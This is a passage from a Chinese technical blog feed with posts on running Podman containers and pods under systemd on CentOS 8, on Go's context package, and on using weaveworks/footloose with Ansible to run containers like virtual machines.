class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/lib/systemd/system/envoy.service </span><br><span class="line">[Unit]</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Restart=always</span><br><span class="line">ExecStart=/usr/bin/podman start -a envoy</span><br><span class="line">ExecStop=/usr/bin/podman stop -t 10 envoy</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>编写完成后，我们需要执行下 <code>systemctl daemon-reload</code> 重新加载一次配置，然后就可以通过 <code>systemctl</code> 来控制容器的启停、开机自启动了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ systemctl start envoy</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ systemctl <span class="built_in">enable</span> envoy</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/envoy.service to /usr/lib/systemd/system/envoy.service.</span><br><span class="line">[root@node99 16:28:12 ~]<span class="variable">$systemctl</span> status envoy</span><br><span class="line">● envoy.service</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/envoy.service; enabled; vendor preset: disabled)</span><br><span class="line">  Drop-In: /etc/systemd/system/envoy.service.d</span><br><span class="line">           └─cgroup.conf</span><br><span class="line">   Active: active (running) since Sat 2019-10-12 20:09:34 CST; 3h 41min left</span><br><span class="line"> Main PID: 47684 (podman)</span><br><span class="line">   CGroup: /system.slice/system-zbs.slice/system-zbs-others.slice/envoy.service</span><br><span class="line">           └─47684 /usr/bin/podman start -a envoy</span><br></pre></td></tr></table></figure><h4 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h4><h5 id="创建及使用"><a href="#创建及使用" class="headerlink" title="创建及使用"></a>创建及使用</h5><p>Podman 除了像 Docker 一样提供基本的容器管理，还提供了 K8S 中的 Pod 功能（得对的起名字啊）。<br>对于最终要运行在 k8s 环境的同学来说，Podman 非常适合，可以很大的减少环境不通导致的工作量：Podman 的 YAML 和 k8s pod yaml 文件格式是兼容的。</p><p>首先，我们来创建一个 Pod：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod create --name postgresql -p 5432 -p 9187</span><br><span class="line">error adding Infra Container: unable to pull k8s.gcr.io/pause:3.1: unable to pull image: Error determining manifest MIME <span class="built_in">type</span> <span class="keyword">for</span> docker://k8s.gcr.io/pause:3.1: pinging docker registry returned: Get https://k8s.gcr.io/v2/: dial tcp 64.233.189.82:443: i/o timeout</span><br></pre></td></tr></table></figure><p>了解 K8S Pod 的同学应该知道 <code>google_containers/pause</code>容器，它主要的作用是 namespace  控制和启动 init 进程，即 PID 为1。在 Podman 中也是如此，这里需要 pull pause 镜像，但是喜闻乐见的 timeout。。。。</p><p>（此处开始折腾网络）</p><p>我们重新来走一次 demo ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod create --name postgresql -p 5432 -p 9187  <span class="comment"># 创建 Pod，并映射端口</span></span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ls                                      </span><br><span class="line">POD ID         NAME         STATUS    CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Running   7 seconds ago   1                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ps </span><br><span class="line">POD ID         NAME         STATUS    CREATED          <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Running   23 seconds ago   1                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman run -d --pod postgresql -e POSTGRES_PASSWORD=password postgres:latest <span class="comment"># 运行 postgresql</span></span><br><span class="line">bb00b1087b3e86f5f8915deb9a826875f4a1f063b30ef6eb743c3ad6b155a823</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman run -d --pod postgresql -e DATA_SOURCE_NAME=<span class="string">"postgresql://postgres:password@localhost:5432/postgres?sslmode=disable"</span>  wrouesnel/postgres_exporter <span class="comment"># 运行 postgres exporter</span></span><br><span class="line">f1197be2aa8be6169e0a0cf3b235b951dafdc4e98afe6753c661a9871038c17c</span><br></pre></td></tr></table></figure><p>首先我们创建了一个 Pod，端口映射是在 Pod 这个级别配置的，然后在这个 Pod 中，我们创建了两个 container，分别是：postgres 和 postgres_exporter ，其中 postgres_exporter 主要是暴露 metrics 用于 Prometheus 抓取进行监控。</p><p>我们可以通过 curl 相应端口来验证是否正常工作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">iran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a              </span><br><span class="line">CONTAINER ID  IMAGE                                                          COMMAND               CREATED        STATUS            PORTS                                           NAMES</span><br><span class="line">f1197be2aa8b  docker.io/wrouesnel/postgres_exporter:latest                   /postgres_exporte...  4 minutes ago  Up 4 minutes ago                                                  quizzical_mcclintock</span><br><span class="line">bb00b1087b3e  docker.io/library/postgres:latest                              docker-entrypoint...  4 minutes ago  Up 4 minutes ago                                                  kind_spence</span><br><span class="line">5f38e2d70484  registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1                        5 minutes ago  Up 5 minutes ago  0.0.0.0:5432-&gt;5432/tcp, 0.0.0.0:9187-&gt;9187/tcp  17020cd16ae6-infra</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics                                                                                                                                 </span><br><span class="line"><span class="comment"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span></span><br><span class="line"><span class="comment"># TYPE go_gc_duration_seconds summary</span></span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.25"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.5"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.75"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"1"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds_sum 0</span><br></pre></td></tr></table></figure><p>可以看到已经正确的获取到了相应 metrics 数值，可以通过 <code>podman pod top</code> 来获取当前进程状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod top postgresql             </span><br><span class="line">USER                PID   PPID   %CPU    ELAPSED           TTY   TIME   COMMAND</span><br><span class="line">0                   1     0      0.000   6m15.74147022s    ?     0s     /pause </span><br><span class="line">postgres            1     0      0.000   5m45.755275073s   ?     0s     postgres </span><br><span class="line">postgres            51    1      0.000   5m44.755304824s   ?     0s     postgres: checkpointer    </span><br><span class="line">postgres            52    1      0.000   5m44.755329093s   ?     0s     postgres: background writer    </span><br><span class="line">postgres            53    1      0.000   5m44.755350888s   ?     0s     postgres: walwriter    </span><br><span class="line">postgres            54    1      0.000   5m44.75537351s    ?     0s     postgres: logical replication launcher    </span><br><span class="line">postgres_exporter   1     0      0.000   5m34.767207535s   ?     0s     /postgres_exporter</span><br></pre></td></tr></table></figure><p>在 Podman 中，可以简单的将 Pod 理解为 docker-compose 中的一组容器，并且可以通过 <code>podman pod start/stop</code> 来控制这组容器的启停：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod stop postgresql                                                                      </span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ls              </span><br><span class="line">POD ID         NAME         STATUS   CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Exited   8 minutes ago   3                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ps </span><br><span class="line">POD ID         NAME         STATUS   CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Exited   8 minutes ago   3                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics</span><br><span class="line">curl: (7) Failed to connect to localhost port 9187: Connection refused</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod start postgresql                                                                                                                                                                            7 ↵</span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics      </span><br><span class="line"><span class="comment"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span></span><br><span class="line"><span class="comment"># TYPE go_gc_duration_seconds summary</span></span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.25"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.5"</span>&#125; 0</span><br></pre></td></tr></table></figure><h5 id="k8s-联动"><a href="#k8s-联动" class="headerlink" title="k8s 联动"></a>k8s 联动</h5><p>通过 <code>podman generate</code> 命令可以生成 k8s 可用的 YAML 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman generate kube postgresql &gt; postgresql.yaml</span><br><span class="line">no matching entries <span class="keyword">in</span> passwd file</span><br></pre></td></tr></table></figure><p>嗯，又遇到了一个错误，在 Github 上有看到相关 issue，先忽略吧。</p><p>使用 <code>podman play</code> 命令可以直接创建完整的 Pod 及其所拥有的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">podman play kube postgresql.yaml</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果从 Docker 迁移过来，有以下几点很纠结：</p><ol><li>说好的 rootless，但是如果你想要进行端口映射，那么还是要老老实实 sudo 的</li><li>虽然 systemd 大法好，但是如果 container 直接被删除了，我要单独的管理 systemd service 配置文件（貌似可以通过 OCI hook 实现</li><li>更新真的太快了</li><li>…</li></ol><p>很多同学都在说 <code>学不动了</code>，纠结归纠结，学还是要学的，说不定最后 <strong>真香</strong> 了呢。</p><p>上述所有功能示例都可以通过官方 Demo 项目运行：<a href="https://github.com/containers/Demos/blob/master/podman_cli/README.md。" target="_blank" rel="noopener">https://github.com/containers/Demos/blob/master/podman_cli/README.md。</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://podman.io/blogs/" target="_blank" rel="noopener">https://podman.io/blogs/</a></li><li><a href="https://podman.io/blogs/2018/10/03/podman-remove-content-homedir.html" target="_blank" rel="noopener">https://podman.io/blogs/2018/10/03/podman-remove-content-homedir.html</a></li><li><a href="https://www.redhat.com/sysadmin/rootless-podman" target="_blank" rel="noopener">https://www.redhat.com/sysadmin/rootless-podman</a></li><li><a href="https://mkdev.me/en/posts/dockerless-part-3-moving-development-environment-to-containers-with-podman" target="_blank" rel="noopener">https://mkdev.me/en/posts/dockerless-part-3-moving-development-environment-to-containers-with-podman</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;CentOS8 在9月24号正式 Release 了，比 RHEL8 要推迟了4个月。这次的更新感觉比 CentOS7 的更新要来的重要，内
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Golang context 使用</title>
    <link href="https://zdyxry.github.io/2019/09/30/Golang-context-%E4%BD%BF%E7%94%A8/"/>
    <id>https://zdyxry.github.io/2019/09/30/Golang-context-使用/</id>
    <published>2019-09-30T10:33:32.000Z</published>
    <updated>2019-10-01T12:38:12.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前段时间在写 Cluster API Provider 的时候，经常会使用 context 传递参数，当时只是按照其他项目中的方式快速的实现，并没有认真的了解 context 具体包含什么，为了解决什么问题，这次来聊一下。</p><p>P.S. 虽然写了一周的 Golang，但是对于标准库有什么还一无所知，找时间应该认真过一遍的。。</p><h2 id="定义与使用"><a href="#定义与使用" class="headerlink" title="定义与使用"></a>定义与使用</h2><p>先看定义：</p><blockquote><p>Package context defines the Context type, which carries deadlines, cancellation signals, and other request-scoped values across API boundaries and between processes.</p></blockquote><ul><li>当一个 goroutine 调用其他 goroutine，随着层级变多，我们想要在外层达到控制的效果</li><li>在必要场景下传递 <strong>必需</strong> 的数据</li></ul><p>其中 <code>Context</code> 这个 interface 中定义了 4 个方法，具体如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Context <span class="keyword">interface</span> &#123;</span><br><span class="line">Deadline() (deadline time.Time, ok <span class="keyword">bool</span>)</span><br><span class="line">Done() &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">Err() error</span><br><span class="line">Value(key <span class="keyword">interface</span>&#123;&#125;) <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>context</code> 包中实现了4个函数，平时也都是使用这些函数：</p><ol><li>func WithCancel(parent Context) (ctx Context, cancel CancelFunc) </li><li>func WithDeadline(parent Context, d time.Time) (Context, CancelFunc)</li><li>func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)</li><li>func WithValue(parent Context, key, val interface{}) Context</li></ol><p>可以看到 Cancel,Deadline,Timeout 都会返回一个 CancelFunc 函数，哪怕我们设定的时间还没到，我们也可以直接使用 CancelFunc 去设置 Context。</p><p>在 context 使用上有官方文档，且有很多博主已经写过很详细的博客，这里只是列一个简单的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"context"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Pass a context with a timeout to tell a blocking function that it</span></span><br><span class="line"><span class="comment">// should abandon its work after the timeout elapses.</span></span><br><span class="line">ctx, cancel := context.WithTimeout(context.Background(), <span class="number">200</span>*time.Millisecond)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Second): <span class="comment">// 等待 1s</span></span><br><span class="line">fmt.Println(<span class="string">"overslept"</span>)</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():  <span class="comment">// 只有当 Channel 关闭时才会返回非空，也就是到了设定的 Timeout 数值</span></span><br><span class="line">fmt.Println(ctx.Err()) <span class="comment">// prints "context deadline exceeded"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>不要把 Context 放到结构体中，以参数传递，在作为参数传递时，需要将其作为第一个参数传递</li><li>如果 Context 传递内容不确定，那么可以传递 <code>context.Background()</code> 或 <code>context.TODO()</code>，不要传递 nil</li><li>不建议使用 <code>context.Value</code> 传递数据</li><li>Context 是通过 <strong>通知</strong> 来达到 <strong>控制</strong> 目的</li><li>Context 并非是全局的，只查询自身及父context 的数据，同理在 Cancel 也是一样的</li></ol><h2 id="（可能存在的）问题"><a href="#（可能存在的）问题" class="headerlink" title="（可能存在的）问题"></a>（可能存在的）问题</h2><p>在搜索过程中，看到<a href="https://faiface.github.io/post/context-should-go-away-go2/" target="_blank" rel="noopener">一篇博客</a>提到了 context 的一些问题：</p><ul><li>传播性<ul><li>当我们有一个包含了100个函数的调用栈，当我们想要通过 context 来达到控制目的时，那么我们需要将 context 作为函数的第一个参数不断的传递下去。</li></ul></li><li>什么时候使用 <code>context.TODO</code> ？</li><li>context.Value 不该用<ul><li>非静态的</li><li>需要在指定功能上使用特定的 key/value</li><li>容易发生 key 冲突</li></ul></li><li>效率低下</li><li>…</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然上面说了那么多，比如上面提到的不应该用 <code>context.Value</code> ，在 ClusterAPI 中有很多使用 <code>context.Value</code> 传值的地方，该用还是用嘛。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://golang.org/pkg/context/#Background" target="_blank" rel="noopener">https://golang.org/pkg/context/#Background</a></li><li><a href="https://www.flysnow.org/2017/05/12/go-in-action-go-context.html" target="_blank" rel="noopener">https://www.flysnow.org/2017/05/12/go-in-action-go-context.html</a></li><li><a href="https://deepzz.com/post/golang-context-package-notes.html" target="_blank" rel="noopener">https://deepzz.com/post/golang-context-package-notes.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/34417106" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34417106</a></li><li><a href="http://imfox.io/2017/11/28/go-context-note/" target="_blank" rel="noopener">http://imfox.io/2017/11/28/go-context-note/</a></li><li><a href="https://faiface.github.io/post/context-should-go-away-go2/" target="_blank" rel="noopener">https://faiface.github.io/post/context-should-go-away-go2/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;前段时间在写 Cluster API Provider 的时候，经常会使用 context 传递参数，当时只是按照其他项目中的方式快速的实现
      
    
    </summary>
    
    
      <category term="Golang" scheme="https://zdyxry.github.io/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>像虚拟机一样运行容器</title>
    <link href="https://zdyxry.github.io/2019/09/19/%E5%83%8F%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%80%E6%A0%B7%E8%BF%90%E8%A1%8C%E5%AE%B9%E5%99%A8/"/>
    <id>https://zdyxry.github.io/2019/09/19/像虚拟机一样运行容器/</id>
    <published>2019-09-19T11:58:57.000Z</published>
    <updated>2019-09-19T11:59:18.627Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>平时看过文章标题比较多的都是说“像容器一样运行虚拟机”，大家都想要有虚拟机的隔离性，又想要容器的便捷性，也有一些开源项目比如 Firecracker 或 KataContainer 在做。今天反过来，来看看如何“像虚拟机一样运行容器”。</p><p>为啥要把容器搞得像虚拟机一样呢？我平时用到容器比较多的地方就是在 CI 集成部分，通过 docker 快速搭建环境，进行单元测试或集成测试，测试完成后清理镜像，简单方便。但是在CD 部分，就有一点比较头疼的问题，就是调试。zouquan 同学之前在知乎上提了一个问题：<a href="https://www.zhihu.com/question/333652815" target="_blank" rel="noopener">容器化环境里如何方便的进行debug和测试？</a>，回答中的一个总结很好的描述了这个问题的关键： <strong>虽然我在本地开发，但我的应用就像在 k8s 里一样。</strong></p><p>那怎么在容器中开发像是在本地一样呢？肯定不能每次改了代码都走一遍 build,push,deploy 的流程，上面问题的回答中给出的是借助各种工具来达成这样的效果，我不像要用那些奇奇怪怪的工作（学不动了），那么只能想办法把容器搞的跟虚拟机一样了。</p><p>最近看到了 weaveworks/footloose 项目，这个项目的简介就是我的最原始的需求：Containers that look like Virtual Machines。先来看看这个项目的示例（开源项目中examples 写的好真是上手快）。</p><h2 id="功能示例"><a href="#功能示例" class="headerlink" title="功能示例"></a>功能示例</h2><h3 id="Ansible-远程控制"><a href="#Ansible-远程控制" class="headerlink" title="Ansible 远程控制"></a>Ansible 远程控制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># footloose config create --replicas 1 # 指定 machine 副本数为 1</span></span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose create                     # 创建目标资源</span></span><br><span class="line">INFO[0000] Creating SSH key: cluster-key ...            </span><br><span class="line">INFO[0000] Docker Image: quay.io/footloose/centos7:0.6.1 present locally </span><br><span class="line">INFO[0000] Creating machine: cluster-node0 ...          </span><br><span class="line">INFO[0001] Machine cluster-node0 is already created...  </span><br><span class="line">[root@yiran ansible]<span class="comment"># cat ansible.cfg                      # 在 ansible 配置文件中指定 inventory 及连接参数</span></span><br><span class="line">[defaults]</span><br><span class="line">inventory=inventory.txt</span><br><span class="line">remote_user=root</span><br><span class="line">debug=no</span><br><span class="line"></span><br><span class="line">[privilege_escalation]</span><br><span class="line">become=no</span><br><span class="line"></span><br><span class="line">[root@yiran ansible]<span class="comment"># cat inventory.txt </span></span><br><span class="line">[all]</span><br><span class="line">cluster-node0 ansible_connection=docker                    <span class="comment"># 编写对应 machine 连接方式</span></span><br><span class="line"></span><br><span class="line">[root@yiran ansible]<span class="comment"># ansible -m ping all                  # 验证 ansible 通信</span></span><br><span class="line">cluster-node0 | SUCCESS =&gt; &#123;</span><br><span class="line">    <span class="string">"changed"</span>: <span class="literal">false</span>, </span><br><span class="line">    <span class="string">"ping"</span>: <span class="string">"pong"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，通过 footloose 创建一个 machine（容器），可以支持我们远程连接，通过 Ansible 来控制，那么我们来试试 Ansible Playbook 的效果：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">- name:</span> <span class="string">Install</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">  hosts:</span> <span class="string">cluster-node0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  tasks:</span></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Add</span> <span class="string">epel-release</span> <span class="string">repo</span></span><br><span class="line"><span class="attr">    yum:</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">epel-release</span></span><br><span class="line"><span class="attr">      state:</span> <span class="string">latest</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Install</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">    yum:</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">      state:</span> <span class="string">latest</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Insert</span> <span class="string">Index</span> <span class="string">Page</span></span><br><span class="line"><span class="attr">    copy:</span></span><br><span class="line"><span class="attr">      content:</span> <span class="string">"welcome to footloose nginx ansible example"</span></span><br><span class="line"><span class="attr">      dest:</span> <span class="string">/usr/share/nginx/html/index.html</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Start</span> <span class="string">NGiNX</span></span><br><span class="line"><span class="attr">    service:</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">      state:</span> <span class="string">started</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># ansible-playbook  example1.yml</span></span><br><span class="line"></span><br><span class="line">PLAY [Install nginx] ********************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] *********************************</span><br><span class="line">ok: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Add epel-release repo] *******************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Install nginx] ********************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Insert Index Page] ***********************************</span><br><span class="line">changed: [cluster-node0]</span><br><span class="line"></span><br><span class="line">TASK [Start NGiNX] 